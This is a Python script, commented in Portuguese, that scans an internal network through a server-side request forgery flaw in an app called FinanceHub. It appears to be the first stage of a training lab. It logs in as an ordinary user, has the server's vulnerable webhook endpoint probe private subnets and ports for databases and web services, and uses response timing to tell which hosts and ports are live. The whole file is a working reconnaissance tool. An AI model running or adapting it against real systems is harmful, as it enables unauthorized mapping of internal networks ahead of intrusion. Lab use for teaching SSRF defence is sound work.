#!/usr/bin/env python3
"""
ETAPA 1 - network_scanner.py
Varredura da rede interna ATRAVÉS do SSRF.

O atacante não tem acesso à rede interna: ele usa o servidor do FinanceHub como
scanner. Para cada IP/porta, o servidor tenta conectar e a resposta é o ORÁCULO:
    - respondeu (reached)          -> porta ABERTA;
    - erro rápido (conn. recusada) -> host existe, porta fechada;
    - lento/timeout                -> IP provavelmente inexistente.

O atacante não conhece a faixa interna: por padrão o scanner varre as faixas
privadas mais comuns em redes de contêiner/nuvem (CANDIDATE_SUBNETS). Para mirar
uma faixa específica, use --subnet.
Ferramenta independente: edite o bloco CONFIGURAÇÃO abaixo e rode com Python.

    python network_scanner.py                       # varre as faixas comuns
    python network_scanner.py --subnet 10.5.0.0/24  # mira uma faixa
"""

import argparse
import ipaddress
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
APP_URL = "http://localhost:8000"    # onde a aplicação-alvo (FinanceHub) roda
USER, PASSWORD = "joao", "senha123"   # conta comum do atacante

# O atacante não sabe a faixa interna: por padrão varre as faixas privadas mais
# comuns em Docker/nuvem. Passe --subnet para mirar uma faixa específica.
CANDIDATE_SUBNETS = [
    "10.5.0.0/24", "172.17.0.0/24", "172.18.0.0/24", "172.19.0.0/24",
    "10.0.0.0/24", "192.168.0.0/24",
]

PORTS = [80, 8080, 8000, 8443, 3000, 5432, 6379, 9200, 27017]
# ==========================================================================

FAST_MS = 2000  # abaixo disto, um erro indica host vivo com porta fechada


def login() -> str:
    r = httpx.post(f"{APP_URL}/auth/login",
                   json={"username": USER, "password": PASSWORD}, timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def ssrf_get(token: str, url: str, timeout: float = 8.0) -> dict:
    """Faz o servidor buscar `url` (SSRF) e devolve reached/status/_rtt_ms."""
    start = time.perf_counter()
    try:
        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
                       headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        data = r.json().get("request", {})
    except Exception as exc:  # noqa: BLE001
        data = {"reached": False, "error": type(exc).__name__, "detail": str(exc)}
    data["_rtt_ms"] = round((time.perf_counter() - start) * 1000, 1)
    return data


def _host_alive(token, ip, timeout):
    """Host vivo se a porta 8080 responde OU recusa rápido (fase de descoberta)."""
    r = ssrf_get(token, f"http://{ip}:8080/", timeout=timeout)
    return r.get("reached") or r.get("_rtt_ms", 99999) < FAST_MS


def _port_open(token, ip, port, timeout):
    return ssrf_get(token, f"http://{ip}:{port}/", timeout=timeout).get("reached")


def scan(token, subnets, ports, threads, timeout):
    """Retorna a lista de 'ip:porta' abertos encontrados nas faixas dadas."""
    open_services = []
    for subnet in subnets:
        hosts = [str(ip) for ip in ipaddress.ip_network(subnet, strict=False).hosts()]
        with ThreadPoolExecutor(max_workers=threads) as ex:
            alive = [h for h, ok in zip(
                hosts, ex.map(lambda ip: _host_alive(token, ip, timeout), hosts)) if ok]
        for ip in alive:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futs = {ex.submit(_port_open, token, ip, p, timeout): p for p in ports}
                for fut in as_completed(futs):
                    if fut.result():
                        service = f"{ip}:{futs[fut]}"
                        open_services.append(service)
                        print(service)   # streaming, direto
    return sorted(open_services, key=lambda s: (ipaddress.ip_address(s.split(':')[0]), int(s.split(':')[1])))


def main(subnets, ports, threads, timeout):
    token = login()
    print(f"# alvo {APP_URL} · varrendo {', '.join(subnets)} via SSRF")
    found = scan(token, subnets, ports, threads, timeout)
    if not found:
        print("# nenhuma porta aberta")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Varredura da rede interna via SSRF (FinanceHub).")
    ap.add_argument("--subnet", default=None,
                    help="faixa(s) CIDR por vírgula; padrão = faixas privadas comuns")
    ap.add_argument("--ports", default=",".join(map(str, PORTS)), help="portas por vírgula")
    ap.add_argument("--threads", type=int, default=30)
    ap.add_argument("--timeout", type=float, default=8.0)
    a = ap.parse_args()
    subnets = a.subnet.split(",") if a.subnet else CANDIDATE_SUBNETS
    main(subnets, [int(p) for p in a.ports.split(",")], a.threads, a.timeout)
